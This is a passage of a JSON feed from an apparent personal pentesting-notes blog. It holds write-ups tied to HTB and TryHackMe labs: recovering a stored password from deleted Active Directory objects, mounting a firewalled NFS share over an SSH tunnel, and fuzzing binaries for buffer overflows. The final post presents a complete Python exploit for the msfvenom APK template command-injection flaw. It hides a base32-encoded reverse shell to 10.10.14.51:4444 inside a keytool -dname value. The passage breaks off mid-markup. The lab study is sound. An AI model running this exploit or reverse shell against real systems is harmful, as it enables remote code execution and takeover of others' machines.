            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can retrieve juicy information from deleted AD Objects if he had gained access to a low-privileged user that has access in deleted AD objects.</p><h2 id=\"environment-setup-and-requirements\">Environment Setup and Requirements</h2><ul>  <li>Low privileged user that can access deleted AD objects</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Check current permission</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\users\\arksvc</span><span class=\"err\">&gt;</span><span class=\"w\"> </span><span class=\"nx\">whoami</span><span class=\"w\"> </span><span class=\"nx\">/all</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">findstr</span><span class=\"w\"> </span><span class=\"nx\">/i</span><span class=\"w\"> </span><span class=\"nx\">recycle</span><span class=\"w\"></span><span class=\"n\">CASCADE\\AD</span><span class=\"w\"> </span><span class=\"nx\">Recycle</span><span class=\"w\"> </span><span class=\"nx\">Bin</span><span class=\"w\">                      </span><span class=\"nx\">Alias</span><span class=\"w\">            </span><span class=\"nx\">S-1-5-21-3332504370-1206983947-1165150453-1119</span><span class=\"w\"> </span><span class=\"nx\">Mandatory</span><span class=\"w\"> </span><span class=\"nx\">group</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"nx\">Enabled</span><span class=\"w\"> </span><span class=\"nx\">by</span><span class=\"w\"> </span><span class=\"nx\">default</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"nx\">Enabled</span><span class=\"w\"> </span><span class=\"nx\">group</span><span class=\"p\">,</span><span class=\"w\"> </span><span class=\"nx\">Local</span><span class=\"w\"> </span><span class=\"nx\">Group</span><span class=\"w\"></span><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\users\\arksvc</span><span class=\"err\">&gt;</span><span class=\"w\"> </span></code></pre></div></div><ul>  <li>Check if you can see deleted objects</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">Get-ADObject</span><span class=\"w\"> </span><span class=\"nt\">-filter</span><span class=\"w\"> </span><span class=\"s1\">'isDeleted -eq $true -and name -ne \"Deleted Objects\"'</span><span class=\"w\"> </span><span class=\"nt\">-includeDeletedObjects</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Find juicy information</li></ul><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"mi\">45689883479503</span><span class=\"w\"></span><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\users</span><span class=\"err\">&gt;</span><span class=\"w\"> </span><span class=\"nx\">Get-ADObject</span><span class=\"w\"> </span><span class=\"nt\">-filter</span><span class=\"w\"> </span><span class=\"s1\">'isDeleted -eq $true'</span><span class=\"w\"> </span><span class=\"nt\">-includeDeletedObjects</span><span class=\"w\"> </span><span class=\"nt\">-Properties</span><span class=\"w\"> </span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"o\">|</span><span class=\"w\"> </span><span class=\"n\">findstr</span><span class=\"w\"> </span><span class=\"nx\">cascadeLegacyPwd</span><span class=\"w\"></span><span class=\"n\">cascadeLegacyPwd</span><span class=\"w\">                </span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"nx\">YmFDVDNyMWFOMDBkbGVz</span><span class=\"w\"></span><span class=\"o\">*</span><span class=\"n\">Evil-WinRM</span><span class=\"o\">*</span><span class=\"w\"> </span><span class=\"nx\">PS</span><span class=\"w\"> </span><span class=\"nx\">C:\\users</span><span class=\"err\">&gt;</span><span class=\"w\"> </span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Cascade</li>  <li>    <table>      <tbody>        <tr>          <td>[Active Directory Recycle Bin</td>          <td>Recover Deleted AD Object</td>          <td>AD Deleted Objects](https://stealthbits.com/blog/active-directory-object-recovery-recycle-bin/)</td>        </tr>      </tbody>    </table>  </li>  <li><a href=\"https://stealthbits.com/blog/active-directory-object-recovery-recycle-bin/\">ACTIVE DIRECTORY OBJECT RECOVERY (RECYCLE BIN)</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/30/ad-recycle-bin",
            
            
            
            "tags": ["windows","ad","pivot","privesc"],
            
            "date_published": "2022-04-30T00:00:00+08:00",
            "date_modified": "2022-04-30T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/28/nfs-hidden-mount",
            "title": "NFS hidden mount",
            "summary": "NFS hidden mount",
            "content_text": "  In THM overpass 3 box, i encountered an NFS port open and listening to all address but I cannot reach it from attacker machine. I suspect firewall is restricting the access.# ss outputtcp   LISTEN      0       64                 0.0.0.0:2049         0.0.0.0:*                                                                                     tcp   ESTAB       0       0                127.0.0.1:42724      127.0.0.1:2049                                                                                  tcp   ESTAB       0       0                127.0.0.1:2049       127.0.0.1:42724                                                                                 tcp   LISTEN      0       64                    [::]:2049            [::]:*    # /etc/exports/home/james *(rw,fsid=0,sync,no_root_squash,insecure)  So in order to access it, I used SSH tunnel technique and mount it on attacker machine via localhost.# from attacker machinessh -L 3049:127.0.0.1:2049 paradox@10.10.190.17  I tried to mount it but it failed with mount(2): No such file or directory error.# from attacker machinesudo mount -vv -t nfs -o port=3049 127.0.0.1:/ /mnt  I saw some redhat reference about fsid and I tried to change my mount a bit and it worked!# / instead of /home/jamessudo mount -vv -t nfs -o port=3049 127.0.0.1:/ /mnt",
            "content_html": "<ul>  <li>In THM overpass 3 box, i encountered an NFS port open and listening to all address but I cannot reach it from attacker machine. I suspect firewall is restricting the access.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># ss output</span>tcp   LISTEN      0       64                 0.0.0.0:2049         0.0.0.0:<span class=\"k\">*</span>                                                                                     tcp   ESTAB       0       0                127.0.0.1:42724      127.0.0.1:2049                                                                                  tcp   ESTAB       0       0                127.0.0.1:2049       127.0.0.1:42724                                                                                 tcp   LISTEN      0       64                    <span class=\"o\">[</span>::]:2049            <span class=\"o\">[</span>::]:<span class=\"k\">*</span>    <span class=\"c\"># /etc/exports</span>/home/james <span class=\"k\">*</span><span class=\"o\">(</span>rw,fsid<span class=\"o\">=</span>0,sync,no_root_squash,insecure<span class=\"o\">)</span></code></pre></div></div><ul>  <li>So in order to access it, I used SSH tunnel technique and mount it on attacker machine via localhost.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># from attacker machine</span>ssh <span class=\"nt\">-L</span> 3049:127.0.0.1:2049 paradox@10.10.190.17</code></pre></div></div><ul>  <li>I tried to mount it but it failed with <code class=\"language-plaintext highlighter-rouge\">mount(2): No such file or directory</code> error.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># from attacker machine</span><span class=\"nb\">sudo </span>mount <span class=\"nt\">-vv</span> <span class=\"nt\">-t</span> nfs <span class=\"nt\">-o</span> <span class=\"nv\">port</span><span class=\"o\">=</span>3049 127.0.0.1:/ /mnt</code></pre></div></div><ul>  <li>I saw some redhat <a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/s1-nfs-server-config-exports\">reference</a> about <code class=\"language-plaintext highlighter-rouge\">fsid</code> and I tried to change my mount a bit and it worked!</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># / instead of /home/james</span><span class=\"nb\">sudo </span>mount <span class=\"nt\">-vv</span> <span class=\"nt\">-t</span> nfs <span class=\"nt\">-o</span> <span class=\"nv\">port</span><span class=\"o\">=</span>3049 127.0.0.1:/ /mnt</code></pre></div></div>",
            "url": "https://mvineza.github.io/spindel/2022/04/28/nfs-hidden-mount",
            
            
            
            "tags": ["linux","nfs","pivot"],
            
            "date_published": "2022-04-28T00:00:00+08:00",
            "date_modified": "2022-04-28T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/24/fuzzing-and-binary-inspection-techniques",
            "title": "Fuzzing and Binary Inspection Techniques",
            "summary": "Fuzzing and Binary Inspection Techniques",
            "content_text": "System and Library CallsIts helpful to always see what system and library calls the binary is performing.# You can see what files, directories, or libraries it# is accessingltrace ./myapp # check system callsstrace /usr/bin/myappI experience this scenario when using ltrace - It appeared that in order to escalate my privileges, I just need to set admin=1 based from ltrace output..www-data@blog:/var/www/wordpress$ ltrace /usr/sbin/checkergetenv(\"admin\")                                  = nilputs(\"Not an Admin\"Not an Admin)                             = 13+++ exited (status 0) +++www-data@blog:/var/www/wordpress$ export admin=1www-data@blog:/var/www/wordpress$ checkerroot@blog:/var/www/wordpress# iduid=0(root) gid=33(www-data) groups=33(www-data)root@blog:/var/www/wordpress#  Segmentation Fault PointBefore finding the instruction pointer offset, you need to find where is the point of the program where buffer overflow occurs. One example is to do an ltrace.$ ./backup a a $(python -c 'print(\"A\"*1000)')# [...redacted...]strcpy(0xffbb0081, \"/\")                          = 0xffbb0081strcpy(0xffbb008d, \"/\")                          = 0xffbb008d# [...redacted...]strstr(\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"..., \"/etc\")strcpy(0xff9020ac, \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"...)# [...redacted...]--- SIGSEGV (Segmentation fault) ---+++ killed by SIGSEGV +++Based from the output above, it looks like it segfaulted on the last instance of strcpy right after strstr. We can now go inside gdb and examine the assembly layout and find the last instance of strcpy.# [...redacted...]0x080489d4 &lt;+22&gt;:\tcall   0x8048670 &lt;strcpy@plt&gt;# [...redacted...]Once we find it out, we can now add a breakpoint on that location. This is just an example, there might be better ways to do this like for example, if you use peda, it will automatically stopped at the buffer overflow point.Parameters Detection  Some custom binaries might not tell you what parameters it can accept such as /usr/local/bin/backup from HTB Node. You can find out the parameters it accept in different ways.# Find readable stringsstirngs /usr/local/bin/backuop# Increment the parameters until you get an output/usr/local/bin/backup a/usr/local/bin/backup a a/usr/local/bin/backup a a a# Increment with fuzzer/usr/local/bin/backup $(python -c \"print('A'*1000)\")/usr/local/bin/backup a $(python -c \"print('A'*1000)\")/usr/local/bin/backup a a $(python -c \"print('A'*1000)\")ManualHere is an example for THM room brainstorm.  Generate buffer in python&gt;&gt;&gt; 'A'*2000&gt;&gt;&gt; # use the output&gt;&gt;&gt; 'A'*2500&gt;&gt;&gt; # use the output  Use the output above on name and message inputsPlease enter your username (max 20 characters): ***Write a message: ***  See where will the program crashed  Once you determine on what input the program crashed, you can now use scripts (e.g python) to continue in finding the offset, eip, etc ..  ::NOTE:: I tried fuzzing name input and it crashed at 15000 bytes buffer which is too much! This is most likely wrong so if you encounter this, try fuzzing other input. One indication if this is wrong is when you generate pattern in msfvenom but the EIP offset cannnot be found.Spiking  Here is an example for Vulnserver  Create spike script# file: trun.spks_readline();s_string(\"TRUN \");s_string_variable(\"0\");  Execute spike against targetgeneric_send_tcp 192.168.18.33 9999 trun.spk 0 0  Other resources          An introduction to fuzzing: using fuzzers (SPIKE) to find vulnerabilities - Infosec Resources —&gt; see also powerpoint included      ",
            "content_html": "<h2 id=\"system-and-library-calls\">System and Library Calls</h2><p>Its helpful to always see what system and library calls the binary is performing.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># You can see what files, directories, or libraries it</span><span class=\"c\"># is accessing</span>ltrace ./myapp <span class=\"c\"># check system calls</span>strace /usr/bin/myapp</code></pre></div></div><p>I experience this scenario when using <code class=\"language-plaintext highlighter-rouge\">ltrace</code> - It appeared that in order to escalate my privileges, I just need to set <code class=\"language-plaintext highlighter-rouge\">admin=1</code> based from <code class=\"language-plaintext highlighter-rouge\">ltrace</code> output..</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>www-data@blog:/var/www/wordpress<span class=\"nv\">$ </span>ltrace /usr/sbin/checkergetenv<span class=\"o\">(</span><span class=\"s2\">\"admin\"</span><span class=\"o\">)</span>                                  <span class=\"o\">=</span> nilputs<span class=\"o\">(</span><span class=\"s2\">\"Not an Admin\"</span>Not an Admin<span class=\"o\">)</span>                             <span class=\"o\">=</span> 13+++ exited <span class=\"o\">(</span>status 0<span class=\"o\">)</span> +++www-data@blog:/var/www/wordpress<span class=\"nv\">$ </span><span class=\"nb\">export </span><span class=\"nv\">admin</span><span class=\"o\">=</span>1www-data@blog:/var/www/wordpress<span class=\"nv\">$ </span>checkerroot@blog:/var/www/wordpress# <span class=\"nb\">id</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>33<span class=\"o\">(</span>www-data<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>33<span class=\"o\">(</span>www-data<span class=\"o\">)</span>root@blog:/var/www/wordpress#  </code></pre></div></div><h2 id=\"segmentation-fault-point\">Segmentation Fault Point</h2><p>Before finding the instruction pointer offset, you need to find where is the point of the program where buffer overflow occurs. One example is to do an <code class=\"language-plaintext highlighter-rouge\">ltrace</code>.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>./backup a a <span class=\"si\">$(</span>python <span class=\"nt\">-c</span> <span class=\"s1\">'print(\"A\"*1000)'</span><span class=\"si\">)</span><span class=\"c\"># [...redacted...]</span>strcpy<span class=\"o\">(</span>0xffbb0081, <span class=\"s2\">\"/\"</span><span class=\"o\">)</span>                          <span class=\"o\">=</span> 0xffbb0081strcpy<span class=\"o\">(</span>0xffbb008d, <span class=\"s2\">\"/\"</span><span class=\"o\">)</span>                          <span class=\"o\">=</span> 0xffbb008d<span class=\"c\"># [...redacted...]</span>strstr<span class=\"o\">(</span><span class=\"s2\">\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"</span>..., <span class=\"s2\">\"/etc\"</span><span class=\"o\">)</span>strcpy<span class=\"o\">(</span>0xff9020ac, <span class=\"s2\">\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"</span>...<span class=\"o\">)</span><span class=\"c\"># [...redacted...]</span><span class=\"nt\">---</span> SIGSEGV <span class=\"o\">(</span>Segmentation fault<span class=\"o\">)</span> <span class=\"nt\">---</span>+++ killed by SIGSEGV +++</code></pre></div></div><p>Based from the output above, it looks like it segfaulted on the last instance of <code class=\"language-plaintext highlighter-rouge\">strcpy</code> right after <code class=\"language-plaintext highlighter-rouge\">strstr</code>. We can now go inside gdb and examine the assembly layout and find the last instance of <code class=\"language-plaintext highlighter-rouge\">strcpy</code>.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># [...redacted...]</span>0x080489d4 &lt;+22&gt;:\tcall   0x8048670 &lt;strcpy@plt&gt;<span class=\"c\"># [...redacted...]</span></code></pre></div></div><p>Once we find it out, we can now add a breakpoint on that location. This is just an example, there might be better ways to do this like for example, if you use peda, it will automatically stopped at the buffer overflow point.</p><h2 id=\"parameters-detection\">Parameters Detection</h2><ul>  <li>Some custom binaries might not tell you what parameters it can accept such as <code class=\"language-plaintext highlighter-rouge\">/usr/local/bin/backup</code> from HTB Node. You can find out the parameters it accept in different ways.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Find readable strings</span>stirngs /usr/local/bin/backuop<span class=\"c\"># Increment the parameters until you get an output</span>/usr/local/bin/backup a/usr/local/bin/backup a a/usr/local/bin/backup a a a<span class=\"c\"># Increment with fuzzer</span>/usr/local/bin/backup <span class=\"si\">$(</span>python <span class=\"nt\">-c</span> <span class=\"s2\">\"print('A'*1000)\"</span><span class=\"si\">)</span>/usr/local/bin/backup a <span class=\"si\">$(</span>python <span class=\"nt\">-c</span> <span class=\"s2\">\"print('A'*1000)\"</span><span class=\"si\">)</span>/usr/local/bin/backup a a <span class=\"si\">$(</span>python <span class=\"nt\">-c</span> <span class=\"s2\">\"print('A'*1000)\"</span><span class=\"si\">)</span></code></pre></div></div><h2 id=\"manual\">Manual</h2><p>Here is an example for THM room brainstorm.</p><ul>  <li>Generate buffer in python</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"s\">'A'</span><span class=\"o\">*</span><span class=\"mi\">2000</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"c1\"># use the output</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"s\">'A'</span><span class=\"o\">*</span><span class=\"mi\">2500</span><span class=\"o\">&gt;&gt;&gt;</span> <span class=\"c1\"># use the output</span></code></pre></div></div><ul>  <li>Use the output above on name and message inputs</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>Please enter your username <span class=\"o\">(</span>max 20 characters<span class=\"o\">)</span>: <span class=\"k\">***</span>Write a message: <span class=\"k\">***</span></code></pre></div></div><ul>  <li>See where will the program crashed</li>  <li>Once you determine on what input the program crashed, you can now use scripts (e.g python) to continue in finding the offset, eip, etc ..</li>  <li>::NOTE:: I tried fuzzing name input and it crashed at 15000 bytes buffer which is too much! This is most likely wrong so if you encounter this, try fuzzing other input. One indication if this is wrong is when you generate pattern in <code class=\"language-plaintext highlighter-rouge\">msfvenom</code> but the EIP offset cannnot be found.</li></ul><h2 id=\"spiking\">Spiking</h2><ul>  <li>Here is an example for Vulnserver</li>  <li>Create spike script</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># file: trun.spk</span>s_readline<span class=\"o\">()</span><span class=\"p\">;</span>s_string<span class=\"o\">(</span><span class=\"s2\">\"TRUN \"</span><span class=\"o\">)</span><span class=\"p\">;</span>s_string_variable<span class=\"o\">(</span><span class=\"s2\">\"0\"</span><span class=\"o\">)</span><span class=\"p\">;</span></code></pre></div></div><ul>  <li>Execute spike against target</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>generic_send_tcp 192.168.18.33 9999 trun.spk 0 0</code></pre></div></div><ul>  <li>Other resources    <ul>      <li><a href=\"https://resources.infosecinstitute.com/topic/intro-to-fuzzing/\">An introduction to fuzzing: using fuzzers (SPIKE) to find vulnerabilities - Infosec Resources</a> —&gt; see also powerpoint included</li>    </ul>  </li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/04/24/fuzzing-and-binary-inspection-techniques",
            
            
            
            "tags": ["linux","bof"],
            
            "date_published": "2022-04-24T00:00:00+08:00",
            "date_modified": "2022-04-24T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/21/android-apk-command-injection-via-msfvenom-template",
            "title": "Android APK Command Injection via msfvenom template",
            "summary": "Android APK Command Injection via msfvenom template",
            "content_text": "OverviewAttacker can upload malicuous APK file which contains arbritrary commands which then can be used as a template file for msfvenom command.Versions Tested  Metasploit 6.0.9Steps  Install jarsignersudo apt install openjdk-11-jdk-headless  Create the following python script#!/usr/bin/env python3import subprocessimport tempfileimport osfrom base64 import b32encode# Change me# payload = 'echo \"Code execution as $(id)\" &gt; /tmp/win'# payload = 'ping -c 1 10.10.14.51'# payload = 'bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1'payload = '/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1\"'# b32encode to avoid badchars (keytool is picky)# thanks to @fdellwing for noticing that base64 can sometimes break keytool# &lt;https://github.com/justinsteven/advisories/issues/2&gt;payload_b32 = b32encode(payload.encode()).decode()dname = f\"CN='|echo {payload_b32} | base32 -d | sh #\"print(f\"[+] Manufacturing evil apkfile\")print(f\"Payload: {payload}\")print(f\"-dname: {dname}\")print()tmpdir = tempfile.mkdtemp()apk_file = os.path.join(tmpdir, \"evil.apk\")empty_file = os.path.join(tmpdir, \"empty\")keystore_file = os.path.join(tmpdir, \"signing.keystore\")storepass = keypass = \"password\"key_alias = \"signing.key\"# Touch empty_fileopen(empty_file, \"w\").close()# Create apk_filesubprocess.check_call([\"zip\", \"-j\", apk_file, empty_file])# Generate signing key with malicious -dnamesubprocess.check_call([\"keytool\", \"-genkey\", \"-keystore\", keystore_file, \"-alias\", key_alias, \"-storepass\", storepass,                       \"-keypass\", keypass, \"-keyalg\", \"RSA\", \"-keysize\", \"2048\", \"-dname\", dname])# Sign APK using our malicious dnamesubprocess.check_call([\"jarsigner\", \"-sigalg\", \"SHA1withRSA\", \"-digestalg\", \"SHA1\", \"-keystore\", keystore_file,                       \"-storepass\", storepass, \"-keypass\", keypass, apk_file, key_alias])print()print(f\"[+] Done! apkfile is at {apk_file}\")print(f\"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null\")  Create APK file➜  exploit python3 create_evil_apk.py [+] Manufacturing evil apkfile[...redacted...][+] Done! apkfile is at /tmp/tmp9kymcdg3/evil.apk[...redacted...]➜  exploit   Open netcat listener  Upload APK file to web app, generate and wait for reverse connectionReferences  HTB ScriptKiddie  advisories/2020_metasploit_msfvenom_apk_template_cmdi.md at master · justinsteven/advisories · GitHub  Rapid7 Metasploit Framework msfvenom APK Template Command Injection",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can upload malicuous APK file which contains arbritrary commands which then can be used as a template file for <code class=\"language-plaintext highlighter-rouge\">msfvenom</code> command.</p><h2 id=\"versions-tested\">Versions Tested</h2><ul>  <li>Metasploit 6.0.9</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Install jarsigner</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">sudo </span>apt <span class=\"nb\">install </span>openjdk-11-jdk-headless</code></pre></div></div><ul>  <li>Create the following python script</li></ul><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/env python3</span><span class=\"kn\">import</span> <span class=\"nn\">subprocess</span><span class=\"kn\">import</span> <span class=\"nn\">tempfile</span><span class=\"kn\">import</span> <span class=\"nn\">os</span><span class=\"kn\">from</span> <span class=\"nn\">base64</span> <span class=\"kn\">import</span> <span class=\"n\">b32encode</span><span class=\"c1\"># Change me# payload = 'echo \"Code execution as $(id)\" &gt; /tmp/win'# payload = 'ping -c 1 10.10.14.51'# payload = 'bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1'</span><span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"s\">'/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.51/4444 0&gt;&amp;1\"'</span><span class=\"c1\"># b32encode to avoid badchars (keytool is picky)# thanks to @fdellwing for noticing that base64 can sometimes break keytool# &lt;https://github.com/justinsteven/advisories/issues/2&gt;</span><span class=\"n\">payload_b32</span> <span class=\"o\">=</span> <span class=\"n\">b32encode</span><span class=\"p\">(</span><span class=\"n\">payload</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">()).</span><span class=\"n\">decode</span><span class=\"p\">()</span><span class=\"n\">dname</span> <span class=\"o\">=</span> <span class=\"sa\">f</span><span class=\"s\">\"CN='|echo </span><span class=\"si\">{</span><span class=\"n\">payload_b32</span><span class=\"si\">}</span><span class=\"s\"> | base32 -d | sh #\"</span><span class=\"k\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"s\">\"[+] Manufacturing evil apkfile\"</span><span class=\"p\">)</span><span class=\"k\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"s\">\"Payload: </span><span class=\"si\">{</span><span class=\"n\">payload</span><span class=\"si\">}</span><span class=\"s\">\"</span><span class=\"p\">)</span><span class=\"k\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"s\">\"-dname: </span><span class=\"si\">{</span><span class=\"n\">dname</span><span class=\"si\">}</span><span class=\"s\">\"</span><span class=\"p\">)</span><span class=\"k\">print</span><span class=\"p\">()</span><span class=\"n\">tmpdir</span> <span class=\"o\">=</span> <span class=\"n\">tempfile</span><span class=\"p\">.</span><span class=\"n\">mkdtemp</span><span class=\"p\">()</span><span class=\"n\">apk_file</span> <span class=\"o\">=</span> <span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">path</span><span class=\"p\">.</span><span class=\"n\">join</span><span class=\"p\">(</span><span class=\"n\">tmpdir</span><span class=\"p\">,</span> <span class=\"s\">\"evil.apk\"</span><span class=\"p\">)</span><span class=\"n\">empty_file</span> <span class=\"o\">=</span> <span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">path</span><span class=\"p\">.</span><span class=\"n\">join</span><span class=\"p\">(</span><span class=\"n\">tmpdir</span><span class=\"p\">,</span> <span class=\"s\">\"empty\"</span><span class=\"p\">)</span><span class=\"n\">keystore_file</span> <span class=\"o\">=</span> <span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">path</span><span class=\"p\">.</span><span class=\"n\">join</span><span class=\"p\">(</span><span class=\"n\">tmpdir</span><span class=\"p\">,</span> <span class=\"s\">\"signing.keystore\"</span><span class=\"p\">)</span><span class=\"n\">storepass</span> <span class=\"o\">=</span> <span class=\"n\">keypass</span> <span class=\"o\">=</span> <span class=\"s\">\"password\"</span><span class=\"n\">key_alias</span> <span class=\"o\">=</span> <span class=\"s\">\"signing.key\"</span><span class=\"c1\"># Touch empty_file</span><span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">empty_file</span><span class=\"p\">,</span> <span class=\"s\">\"w\"</span><span class=\"p\">).</span><span class=\"n\">close</span><span class=\"p\">()</span><span class=\"c1\"># Create apk_file</span><span class=\"n\">subprocess</span><span class=\"p\">.</span><span class=\"n\">check_call</span><span class=\"p\">([</span><span class=\"s\">\"zip\"</span><span class=\"p\">,</span> <span class=\"s\">\"-j\"</span><span class=\"p\">,</span> <span class=\"n\">apk_file</span><span class=\"p\">,</span> <span class=\"n\">empty_file</span><span class=\"p\">])</span><span class=\"c1\"># Generate signing key with malicious -dname</span><span class=\"n\">subprocess</span><span class=\"p\">.</span><span class=\"n\">check_call</span><span class=\"p\">([</span><span class=\"s\">\"keytool\"</span><span class=\"p\">,</span> <span class=\"s\">\"-genkey\"</span><span class=\"p\">,</span> <span class=\"s\">\"-keystore\"</span><span class=\"p\">,</span> <span class=\"n\">keystore_file</span><span class=\"p\">,</span> <span class=\"s\">\"-alias\"</span><span class=\"p\">,</span> <span class=\"n\">key_alias</span><span class=\"p\">,</span> <span class=\"s\">\"-storepass\"</span><span class=\"p\">,</span> <span class=\"n\">storepass</span><span class=\"p\">,</span>                       <span class=\"s\">\"-keypass\"</span><span class=\"p\">,</span> <span class=\"n\">keypass</span><span class=\"p\">,</span> <span class=\"s\">\"-keyalg\"</span><span class=\"p\">,</span> <span class=\"s\">\"RSA\"</span><span class=\"p\">,</span> <span class=\"s\">\"-keysize\"</span><span class=\"p\">,</span> <span class=\"s\">\"2048\"</span><span class=\"p\">,</span> <span class=\"s\">\"-dname\"</span><span class=\"p\">,</span> <span class=\"n\">dname</span><span class=\"p\">])</span><span class=\"c1\"># Sign APK using our malicious dname</span><span class=\"n\">subprocess</span><span class=\"p\">.</span><span class=\"n\">check_call</span><span class=\"p\">([</span><span class=\"s\">\"jarsigner\"</span><span class=\"p\">,</span> <span class=\"s\">\"-sigalg\"</span><span class=\"p\">,</span> <span class=\"s\">\"SHA1withRSA\"</span><span class=\"p\">,</span> <span class=\"s\">\"-digestalg\"</span><span class=\"p\">,</span> <span class=\"s\">\"SHA1\"</span><span class=\"p\">,</span> <span class=\"s\">\"-keystore\"</span><span class=\"p\">,</span> <span class=\"n\">keystore_file</span><span class=\"p\">,</span>                       <span class=\"s\">\"-storepass\"</span><span class=\"p\">,</span> <span class=\"n\">storepass</span><span class=\"p\">,</span> <span class=\"s\">\"-keypass\"</span><span class=\"p\">,</span> <span class=\"n\">keypass</span><span class=\"p\">,</span> <span class=\"n\">apk_file</span><span class=\"p\">,</span> <span class=\"n\">key_alias</span><span class=\"p\">])</span><span class=\"k\">print</span><span class=\"p\">()</span><span class=\"k\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"s\">\"[+] Done! apkfile is at </span><span class=\"si\">{</span><span class=\"n\">apk_file</span><span class=\"si\">}</span><span class=\"s\">\"</span><span class=\"p\">)</span><span class=\"k\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"s\">\"Do: msfvenom -x </span><span class=\"si\">{</span><span class=\"n\">apk_file</span><span class=\"si\">}</span><span class=\"s\"> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null\"</span><span class=\"p\">)</span></code></pre></div></div><ul>  <li>Create APK file</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  exploit python3 create_evil_apk.py <span 